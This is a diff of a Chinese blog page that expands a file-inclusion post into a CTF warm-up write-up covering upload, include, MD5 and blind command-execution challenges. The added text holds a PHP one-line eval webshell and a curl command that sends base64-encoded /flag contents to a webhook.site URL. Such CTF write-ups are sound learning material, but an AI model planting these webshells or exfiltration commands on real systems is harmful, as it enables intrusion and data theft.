@@ -19,15 +19,15 @@
   <meta name="author" content="suny">
   <meta name="keywords" content="">
   
-    <meta name="description" content="记录ez_include题解顺便学习一下文件包含漏洞首先打开容器，发现非常简短，只有一行代码 1include($_GET[&#x27;zpf&#x27;])  include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。 首先尝试利用?zpf&#x3D;&#x2F;etc&#x2F;passwd 读取系统目录，但并没有发现什么有价值的信息。 下面尝试利用?zpf&#x3D;php:&#x2F;&#x2F;filter&#x2F;conver">
+    <meta name="description" content="ez_uploadphp图片马 上传一张图片然后拦截请求，修改文件后缀名及内容，植入一句话木马 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  rHeEsApDoEnRsSe根据题目名及页面提示，flag在响应头里面，使用curl命令 1curl -I http:&#x2F;&#x2F;175.27.251.122:32999&#x2F;  curl 是一个功能强大的命令行工具">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件包含漏洞">
-<meta property="og:url" content="https://www.sunynov.top/2025/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:url" content="https://www.sunynov.top/2025/11/19/SDPC2025%E7%83%AD%E8%BA%AB%E8%B5%9B/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="记录ez_include题解顺便学习一下文件包含漏洞首先打开容器，发现非常简短，只有一行代码 1include($_GET[&#x27;zpf&#x27;])  include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。 首先尝试利用?zpf&#x3D;&#x2F;etc&#x2F;passwd 读取系统目录，但并没有发现什么有价值的信息。 下面尝试利用?zpf&#x3D;php:&#x2F;&#x2F;filter&#x2F;conver">
+<meta property="og:description" content="ez_uploadphp图片马 上传一张图片然后拦截请求，修改文件后缀名及内容，植入一句话木马 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  rHeEsApDoEnRsSe根据题目名及页面提示，flag在响应头里面，使用curl命令 1curl -I http:&#x2F;&#x2F;175.27.251.122:32999&#x2F;  curl 是一个功能强大的命令行工具">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-11-19T09:03:18.000Z">
-<meta property="article:modified_time" content="2025-11-20T06:07:25.408Z">
+<meta property="article:modified_time" content="2025-11-22T05:46:10.266Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          296 字
+          838 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          3 分钟
+          7 分钟
         
       </span>
     
@@ -303,7 +303,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年11月20日 下午
+                    本文最后更新于 2025年11月22日 下午
                   
                 
               </p>
@@ -311,7 +311,39 @@
             
               <div class="markdown-body">
                 
-                <h2 id="记录ez-include题解顺便学习一下文件包含漏洞"><a href="#记录ez-include题解顺便学习一下文件包含漏洞" class="headerlink" title="记录ez_include题解顺便学习一下文件包含漏洞"></a>记录ez_include题解顺便学习一下文件包含漏洞</h2><p>首先打开容器，发现非常简短，只有一行代码</p>
+                <h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>php图片马</p>
+<p>上传一张图片然后拦截请求，修改文件后缀名及内容，植入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="rHeEsApDoEnRsSe"><a href="#rHeEsApDoEnRsSe" class="headerlink" title="rHeEsApDoEnRsSe"></a>rHeEsApDoEnRsSe</h2><p>根据题目名及页面提示，flag在响应头里面，使用curl命令</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl <span class="hljs-punctuation">-</span>I http<span class="hljs-punctuation">:</span><span class="hljs-comment">//175.27.251.122:32999/</span><br></code></pre></td></tr></table></figure>
+
+<p><code>curl</code> 是一个功能强大的命令行工具，主要用于在网络上传输数据，支持多种协议（如 HTTP、HTTPS、FTP、SFTP 等），常被用于测试接口、下载文件、发送请求等场景。以下是其核心用法总结：</p>
+<ol>
+<li><strong>基本请求</strong><ul>
+<li>发送 GET 请求（默认）：<code>curl [URL]</code>，如 <code>curl https://example.com</code></li>
+<li>发送 POST 请求：<code>curl -X POST [URL]</code>，可搭配 <code>-d</code> 传递数据，如 <code>curl -X POST -d &quot;name=test&quot; https://example.com/api</code></li>
+</ul>
+</li>
+<li><strong>设置请求头</strong>用 <code>-H</code> 指定请求头，如模拟浏览器：<code>curl -H &quot;User-Agent: Mozilla/5.0&quot; https://example.com</code></li>
+<li><strong>下载文件</strong><ul>
+<li>保存为指定文件名：<code>curl -o 文件名 [URL]</code>（如 <code>curl -o file.zip https://example.com/file.zip</code>）</li>
+<li>自动以远程文件名保存：<code>curl -O [URL]</code>（URL 需指向具体文件）</li>
+</ul>
+</li>
+<li><strong>处理认证</strong><ul>
+<li>基础认证：<code>curl -u 用户名:密码 [URL]</code></li>
+<li>携带 Cookie：<code>curl -b &quot;cookie1=value1&quot; [URL]</code>，或保存响应 Cookie 到文件：<code>curl -c cookies.txt [URL]</code></li>
+</ul>
+</li>
+<li><strong>其他常用选项</strong><ul>
+<li>显示详细请求过程：<code>curl -v [URL]</code></li>
+<li>跟随重定向：<code>curl -L [URL]</code></li>
+<li>限制传输速度：<code>curl --limit-rate 100k [URL]</code>（如限制为 100KB&#x2F;s）</li>
+</ul>
+</li>
+</ol>
+<h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>首先发现只有一行代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zpf&#x27;</span>])<br></code></pre></td></tr></table></figure>
 
 <p>include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。</p>
@@ -322,9 +354,30 @@
 
 <p>这里我们发现了非常关键的system函数，但程序对yzx进行了正则过滤，所以我们考虑绕过正则过滤，执行命令</p>
 <p>这里我使用了转义符号绕过，成功读取了目录拿到了flag</p>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1224913">正则过滤绕过</a></p>
+<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1224913">正则过滤绕过</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lilongsy/article/details/108146107">文件包含漏洞</a></p>
+<h2 id="貌合神离"><a href="#貌合神离" class="headerlink" title="貌合神离"></a><strong>貌合神离</strong></h2><p>md5大杂烩</p>
+<h4 id="参考文献-1"><a href="#参考文献-1" class="headerlink" title="参考文献"></a>参考文献</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yolololo/p/18161894">MD5绕过</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dre0m1/p/16062369.html">PHP中MD5和sha1绕过方式总结 - dre0m1 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">总结ctf中 MD5 绕过的一些思路_ctf md5绕过-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.dr0n.top/posts/ad669f62/">CTF中关于md5的一些总结 - Dr0n’s blog</a></p>
+<h2 id="空谷无音"><a href="#空谷无音" class="headerlink" title="空谷无音"></a>空谷无音</h2><p>首先发现命令执行漏洞，但是没有回显，结合题目描述，考虑用其他方式进行外带</p>
+<ul>
+<li>重定向到文件</li>
+</ul>
+<p>我们可以用流重定向符号来将输出内容重定向到文件中, 在通过浏览器进行下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">cmd_here &gt; 1.txt<br></code></pre></td></tr></table></figure>
 
+<p>然后就可以通过访问 1.txt 获取到输出内容了</p>
+<ul>
+<li>通过 <code>curl</code> 外带</li>
+</ul>
+<p>我们可以通过 <a target="_blank" rel="noopener" href="https://webhook.site/">https://webhook.site/</a> 来进行数据外带, 我们可以拿到这样一个链接</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb<br></code></pre></td></tr></table></figure>
+
+<p>此时这个路径下的所有请求都会被记录</p>
+<p>于是我们可以通过shell指令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -342,7 +395,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>文件包含漏洞</div>
-      <div>https://www.sunynov.top/2025/11/19/文件包含漏洞/</div>
+      <div>https://www.sunynov.top/2025/11/19/SDPC2025热身赛/</div>
     </div>
     <div class="license-meta">
       
@@ -385,12 +438,6 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
-                    
-                      <a href="/2025/11/20/CTF%E6%9D%82%E8%AE%B0/" title="CTF杂记">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CTF杂记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
                     
                   </article>
                   <article class="post-next col-6">
